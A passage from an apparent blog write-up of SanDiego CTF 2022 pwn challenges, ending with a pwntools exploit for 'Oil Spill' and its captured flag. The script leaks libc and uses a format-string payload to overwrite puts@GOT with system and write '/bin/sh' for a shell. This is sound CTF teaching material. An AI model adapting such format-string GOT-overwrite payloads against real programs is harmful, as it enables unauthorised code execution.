+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">Crypto.Util.Padding</span> <span style="color:#069;font-weight:bold">import</span> pad
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>arch <span style="color:#555">=</span> <span style="color:#c30">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>encoding <span style="color:#555">=</span> <span style="color:#c30">&#39;latin&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>log_level <span style="color:#555">=</span> <span style="color:#c30">&#39;INFO&#39;</span>
+</span></span><span style="display:flex;"><span>warnings<span style="color:#555">.</span>simplefilter(<span style="color:#c30">&#34;ignore&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#555">=</span> ELF(<span style="color:#c30">&#34;./OilSpill_patched&#34;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#555">=</span> ELF(<span style="color:#c30">&#34;./libc-2.27.so&#34;</span>)
+</span></span><span style="display:flex;"><span>ld <span style="color:#555">=</span> ELF(<span style="color:#c30">&#34;./ld-2.27.so&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>binary <span style="color:#555">=</span> exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">conn</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> args<span style="color:#555">.</span>LOCAL:
+</span></span><span style="display:flex;"><span>        r <span style="color:#555">=</span> process([exe<span style="color:#555">.</span>path])
+</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> args<span style="color:#555">.</span>PLT_DEBUG:
+</span></span><span style="display:flex;"><span>            gdb<span style="color:#555">.</span>attach(r, gdbscript<span style="color:#555">=</span><span style="color:#c30">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">            b *main+186
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">            &#39;&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#555">=</span> remote(<span style="color:#c30">&#34;oil.sdc.tf&#34;</span>, <span style="color:#f60">1337</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> r
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#555">=</span> conn()
+</span></span><span style="display:flex;"><span>outs <span style="color:#555">=</span> r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>)<span style="color:#555">.</span>strip()<span style="color:#555">.</span>split(<span style="color:#c30">b</span><span style="color:#c30">&#39;,&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;Outs: </span><span style="color:#a00">{</span>outs<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>leaked_puts <span style="color:#555">=</span> <span style="color:#366">int</span>(outs[<span style="color:#f60">0</span>], <span style="color:#f60">16</span>)
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#555">=</span> leaked_puts <span style="color:#555">-</span> libc<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;puts&#39;</span>]
+</span></span><span style="display:flex;"><span>libc<span style="color:#555">.</span>address <span style="color:#555">=</span> libc_base
+</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;Leaked Libc base: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(libc_base)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>system_addr <span style="color:#555">=</span> libc<span style="color:#555">.</span>symbols[<span style="color:#c30">&#34;system&#34;</span>]
+</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;system@libc: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(system_addr)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
+</span></span><span style="display:flex;"><span>puts_got <span style="color:#555">=</span> exe<span style="color:#555">.</span>got[<span style="color:#c30">&#34;puts&#34;</span>] <span style="color:#09f;font-style:italic"># This will be overwritten with system</span>
+</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;puts@got  : </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(puts_got)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>x_addr <span style="color:#555">=</span> exe<span style="color:#555">.</span>symbols[<span style="color:#c30">&#34;x&#34;</span>] <span style="color:#09f;font-style:italic"># This will be overwritten with /bin/sh\x00</span>
+</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;x         : </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(x_addr)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;Try to overwrite GOT puts to system....&#39;</span>)
+</span></span><span style="display:flex;"><span>fmt_str <span style="color:#555">=</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>fmt_str <span style="color:#555">+=</span> <span style="color:#c30">f</span><span style="color:#c30">&#39;%21$hhn&#39;</span><span style="color:#555">.</span>encode() <span style="color:#09f;font-style:italic"># Overwrite lsb of x to \x00</span>
+</span></span><span style="display:flex;"><span>fmt_str <span style="color:#555">+=</span> <span style="color:#c30">f</span><span style="color:#c30">&#39;%</span><span style="color:#a00">{</span><span style="color:#f60">0x20</span><span style="color:#a00">}</span><span style="color:#c30">c%22$hhn&#39;</span><span style="color:#555">.</span>encode() <span style="color:#09f;font-style:italic"># Overwrite lsb of puts to lsb of system</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Overwrite x to &#39;/bin/sh&#39;</span>
+</span></span><span style="display:flex;"><span>fmt_str <span style="color:#555">+=</span> <span style="color:#c30">f</span><span style="color:#c30">&#39;%</span><span style="color:#a00">{</span><span style="color:#f60">0x2f</span><span style="color:#555">-</span><span style="color:#f60">0x20</span><span style="color:#a00">}</span><span style="color:#c30">c%23$hhn&#39;</span><span style="color:#555">.</span>encode()
+</span></span><span style="display:flex;"><span>fmt_str <span style="color:#555">+=</span> <span style="color:#c30">f</span><span style="color:#c30">&#39;%24$hhn&#39;</span><span style="color:#555">.</span>encode()
+</span></span><span style="display:flex;"><span>fmt_str <span style="color:#555">+=</span> <span style="color:#c30">f</span><span style="color:#c30">&#39;%</span><span style="color:#a00">{</span><span style="color:#f60">0x62</span><span style="color:#555">-</span><span style="color:#f60">0x2f</span><span style="color:#a00">}</span><span style="color:#c30">c%25$hhn&#39;</span><span style="color:#555">.</span>encode()
+</span></span><span style="display:flex;"><span>fmt_str <span style="color:#555">+=</span> <span style="color:#c30">f</span><span style="color:#c30">&#39;%</span><span style="color:#a00">{</span><span style="color:#f60">0x68</span><span style="color:#555">-</span><span style="color:#f60">0x62</span><span style="color:#a00">}</span><span style="color:#c30">c%26$hhn&#39;</span><span style="color:#555">.</span>encode()
+</span></span><span style="display:flex;"><span>fmt_str <span style="color:#555">+=</span> <span style="color:#c30">f</span><span style="color:#c30">&#39;%</span><span style="color:#a00">{</span><span style="color:#f60">0x69</span><span style="color:#555">-</span><span style="color:#f60">0x68</span><span style="color:#a00">}</span><span style="color:#c30">c%27$hhn&#39;</span><span style="color:#555">.</span>encode()
+</span></span><span style="display:flex;"><span>fmt_str <span style="color:#555">+=</span> <span style="color:#c30">f</span><span style="color:#c30">&#39;%</span><span style="color:#a00">{</span><span style="color:#f60">0x6e</span><span style="color:#555">-</span><span style="color:#f60">0x69</span><span style="color:#a00">}</span><span style="color:#c30">c%28$hhn&#39;</span><span style="color:#555">.</span>encode()
+</span></span><span style="display:flex;"><span>fmt_str <span style="color:#555">+=</span> <span style="color:#c30">f</span><span style="color:#c30">&#39;%</span><span style="color:#a00">{</span><span style="color:#f60">0x73</span><span style="color:#555">-</span><span style="color:#f60">0x6e</span><span style="color:#a00">}</span><span style="color:#c30">c%29$hhn&#39;</span><span style="color:#555">.</span>encode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Overwrite 2nd and 3rd byte of puts to system</span>
+</span></span><span style="display:flex;"><span>second_third_byte_system <span style="color:#555">=</span> u64(p64(system_addr)[<span style="color:#f60">1</span>:<span style="color:#f60">3</span>]<span style="color:#555">.</span>ljust(<span style="color:#f60">8</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x00</span><span style="color:#c30">&#39;</span>))
+</span></span><span style="display:flex;"><span>fmt_str <span style="color:#555">+=</span> <span style="color:#c30">f</span><span style="color:#c30">&#39;%</span><span style="color:#a00">{</span>second_third_byte_system<span style="color:#555">-</span><span style="color:#f60">0x73</span><span style="color:#a00">}</span><span style="color:#c30">c%30$hn&#39;</span><span style="color:#555">.</span>encode()
+</span></span><span style="display:flex;"><span>fmt_str <span style="color:#555">=</span> pad(fmt_str, <span style="color:#f60">8</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># This will be used as the address that we will overwrite</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># For x_addr, we will overwrite it per byte</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># For puts, we will:</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - Overwrite the last byte first (0x20)</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># - Overwrite the second and third byte together</span>
+</span></span><span style="display:flex;"><span>addr <span style="color:#555">=</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>addr <span style="color:#555">+=</span> p64(x_addr<span style="color:#555">+</span><span style="color:#f60">7</span>) <span style="color:#555">+</span> p64(puts_got) <span style="color:#555">+</span> p64(x_addr)
+</span></span><span style="display:flex;"><span>addr <span style="color:#555">+=</span> p64(x_addr<span style="color:#555">+</span><span style="color:#f60">4</span>) <span style="color:#555">+</span> p64(x_addr<span style="color:#555">+</span><span style="color:#f60">1</span>) <span style="color:#555">+</span> p64(x_addr <span style="color:#555">+</span> <span style="color:#f60">6</span>)
+</span></span><span style="display:flex;"><span>addr <span style="color:#555">+=</span> p64(x_addr <span style="color:#555">+</span> <span style="color:#f60">2</span>) <span style="color:#555">+</span> p64(x_addr <span style="color:#555">+</span> <span style="color:#f60">3</span>) <span style="color:#555">+</span> p64(x_addr <span style="color:#555">+</span> <span style="color:#f60">5</span>)
+</span></span><span style="display:flex;"><span>addr <span style="color:#555">+=</span> p64(puts_got<span style="color:#555">+</span><span style="color:#f60">1</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#555">=</span> fmt_str <span style="color:#555">+</span> addr
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;to clean it?</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>, payload)
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>readrepeat(<span style="color:#f60">1</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>interactive()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>Flag: sdctf{th4nks_f0r_S4V1nG_tH3_duCk5}</p>
+</blockquote>
+<h2 id="social-media">Social Media <a href="#social-media" class="anchor">#</a></h2>
+<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener">twitter</a></p>
+
+      </div>
+      
+        
+  <aside class="toc-container">
+    <a href="#" style="font-weight: 700; color: black;">SanDiego CTF 2022</a>
+    <div class="js-toc">
+      <details>
+          <summary>Table of Contents
+          </summary>
+          <div>
+              <nav id="TableOfContents">
+  <ul>
+    <li><a href="#pwn">Pwn</a>
+      <ul>
+        <li><a href="#horoscope">Horoscope</a></li>
+        <li><a href="#secure-horoscope">Secure-Horoscope</a></li>
+        <li><a href="#oil-spill">Oil Spill</a></li>
+      </ul>
+    </li>
+    <li><a href="#social-media">Social Media</a></li>
+  </ul>
+</nav>
+          </div>
+      </details>
+    </div>
+  </aside>
+
+
+      
+    </div>
+
+    
+        <div class="tags">
+            
+                <a href="https://chovid99.github.io/tags/writeup">Writeup</a>
+            
+                <a href="https://chovid99.github.io/tags/sandiego-ctf">SanDiego CTF</a>
+            
+                <a href="https://chovid99.github.io/tags/heap">heap</a>
+            
+                <a href="https://chovid99.github.io/tags/pwn">pwn</a>
+            
+                <a href="https://chovid99.github.io/tags/format-string">format string</a>
+            
+                <a href="https://chovid99.github.io/tags/buffer-overflow">buffer overflow</a>
+            
+                <a href="https://chovid99.github.io/tags/2022">2022</a>
+            
+        </div>
+    
+    
+    
+  <div id="comment">
+    
+    
+  </div>
+
+
+</section>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="/js/tocbot.min.js"></script>
+
+<script type="text/javascript">
+  tocbot.init({
+      
+      tocSelector: '.js-toc',
+      
+      contentSelector: '.js-toc-content',
+      headingSelector: 'h1, h2, h3',
+      orderedList: false,
+      headingLabelCallback: s => s.substr(0, s.length-2),
+      collapseDepth: 2
+  });
+  function initTOC() {
+    var windowWidth = 1316;
+    var $block_2 = $(".toc-container");
+    var lastLeft = parseFloat($block_2.css("left").slice(0, -2))*(100/($(window).width()));
+    $block_2.css("left", (lastLeft/lastWindowWidth)*$(window).width() + "vw");
+  }
+  window.onload = initTOC;
+
+  var lastWindowWidth = $(window).width();
+  $(window).resize(function() {
+    var $block_2 = $(".toc-container");
+    var lastLeft = parseFloat($block_2.css("left").slice(0, -2))*(100/($(window).width()));
+    $block_2.css("left", (lastLeft/lastWindowWidth)*$(window).width() + "vw");
+    lastWindowWidth = $(window).width();
+  });
+</script>
+
+    </main>
+    
+    <footer id="footer">
+    
+        <div id="social">
+
+
+    <a class="symbol" href="https://github.com/Chovid99" rel="me" target="_blank">
+        
+        <svg fill="#bbbbbb" width="28" height="28"  viewBox="0 0 72 72" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+    
+    <title>Github</title>
+    <desc>Created with Sketch.</desc>
+    <defs></defs>
+    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+        <g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)">
+            <g id="Github" transform="translate(264.000000, 939.000000)">
+                <path d="M8,72 L64,72 C68.418278,72 72,68.418278 72,64 L72,8 C72,3.581722 68.418278,-8.11624501e-16 64,0 L8,0 C3.581722,8.11624501e-16 -5.41083001e-16,3.581722 0,8 L0,64 C5.41083001e-16,68.418278 3.581722,72 8,72 Z" id="Rounded" fill="#bbbbbb"></path>
+                <path d="M35.9985,13 C22.746,13 12,23.7870921 12,37.096644 C12,47.7406712 18.876,56.7718301 28.4145,59.9584121 C29.6145,60.1797862 30.0525,59.4358488 30.0525,58.7973276 C30.0525,58.2250681 30.0315,56.7100863 30.0195,54.6996482 C23.343,56.1558981 21.9345,51.4693938 21.9345,51.4693938 C20.844,48.6864054 19.2705,47.9454799 19.2705,47.9454799 C17.091,46.4500754 19.4355,46.4801943 19.4355,46.4801943 C21.843,46.6503662 23.1105,48.9634994 23.1105,48.9634994 C25.2525,52.6455377 28.728,51.5823398 30.096,50.9649018 C30.3135,49.4077535 30.9345,48.3460615 31.62,47.7436831 C26.2905,47.1352808 20.688,45.0691228 20.688,35.8361671 C20.688,33.2052792 21.6225,31.0547881 23.1585,29.3696344 C22.911,28.7597262 22.0875,26.3110578 23.3925,22.9934585 C23.3925,22.9934585 25.4085,22.3459017 29.9925,25.4632101 C31.908,24.9285993 33.96,24.6620468 36.0015,24.6515052 C38.04,24.6620468 40.0935,24.9285993 42.0105,25.4632101 C46.5915,22.3459017 48.603,22.9934585 48.603,22.9934585 C49.9125,26.3110578 49.089,28.7597262 48.8415,29.3696344 C50.3805,31.0547881 51.309,33.2052792 51.309,35.8361671 C51.309,45.0917119 45.6975,47.1292571 40.3515,47.7256117 C41.2125,48.4695491 41.9805,49.9393525 41.9805,52.1877301 C41.9805,55.4089489 41.9505,58.0067059 41.9505,58.7973276 C41.9505,59.4418726 42.3825,60.1918338 43.6005,59.9554002 C53.13,56.7627944 60,47.7376593 60,37.096644 C60,23.7870921 49.254,13 35.9985,13" fill="#FFFFFF"></path>
+            </g>
+        </g>
+    </g>
+</svg>
+    </a>
+
+    <a class="symbol" href="https://twitter.com/Chovid99" rel="me" target="_blank">
+        
+        <svg fill="#bbbbbb" width="28" height="28" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 width="438.536px" height="438.536px" viewBox="0 0 438.536 438.536" style="enable-background:new 0 0 438.536 438.536;"
+	 xml:space="preserve">
+<g>
+	<path d="M414.41,24.123C398.333,8.042,378.963,0,356.315,0H82.228C59.58,0,40.21,8.042,24.126,24.123
+		C8.045,40.207,0.003,59.576,0.003,82.225v274.084c0,22.647,8.042,42.018,24.123,58.102c16.084,16.084,35.454,24.126,58.102,24.126
+		h274.084c22.648,0,42.018-8.042,58.095-24.126c16.084-16.084,24.126-35.454,24.126-58.102V82.225
+		C438.532,59.576,430.49,40.204,414.41,24.123z M335.471,168.735c0.191,1.713,0.288,4.278,0.288,7.71
+		c0,15.989-2.334,32.025-6.995,48.104c-4.661,16.087-11.8,31.504-21.416,46.254c-9.606,14.749-21.074,27.791-34.396,39.115
+		c-13.325,11.32-29.311,20.365-47.968,27.117c-18.648,6.762-38.637,10.143-59.953,10.143c-33.116,0-63.76-8.952-91.931-26.836
+		c4.568,0.568,9.329,0.855,14.275,0.855c27.6,0,52.439-8.565,74.519-25.7c-12.941-0.185-24.506-4.179-34.688-11.991
+		c-10.185-7.803-17.273-17.699-21.271-29.691c4.947,0.76,8.658,1.137,11.132,1.137c4.187,0,9.042-0.76,14.56-2.279
+		c-13.894-2.669-25.598-9.562-35.115-20.697c-9.519-11.136-14.277-23.84-14.277-38.114v-0.571
+		c10.085,4.755,19.602,7.229,28.549,7.422c-17.321-11.613-25.981-28.265-25.981-49.963c0-10.66,2.758-20.747,8.278-30.264
+		c15.035,18.464,33.311,33.213,54.816,44.252c21.507,11.038,44.54,17.227,69.092,18.558c-0.95-3.616-1.427-8.186-1.427-13.704
+		c0-16.562,5.853-30.692,17.56-42.399c11.703-11.706,25.837-17.561,42.394-17.561c17.515,0,32.079,6.283,43.688,18.846
+		c13.134-2.474,25.892-7.33,38.26-14.56c-4.757,14.652-13.613,25.788-26.55,33.402c12.368-1.716,23.88-4.95,34.537-9.708
+		C357.458,149.793,347.462,160.166,335.471,168.735z"/>
+</g>
+</svg>
+
+    </a>
+
+
+</div>
+
+    
+
+    <div class="copyright">
+    
+       © Copyright 
+       2022 
+       <span class="split">
+        <svg fill="#bbbbbb" width="15" height="15" version="1.1" id="heart-15" xmlns="http://www.w3.org/2000/svg" width="15px" height="15px" viewBox="0 0 15 15">
+  <path d="M13.91,6.75c-1.17,2.25-4.3,5.31-6.07,6.94c-0.1903,0.1718-0.4797,0.1718-0.67,0C5.39,12.06,2.26,9,1.09,6.75&#xA;&#x9;C-1.48,1.8,5-1.5,7.5,3.45C10-1.5,16.48,1.8,13.91,6.75z"/>
+</svg>
+       </span>
+       Chovid99
+    
+    </div>
+
+    
+</footer>
+
+
+
+  </body>
+</html>
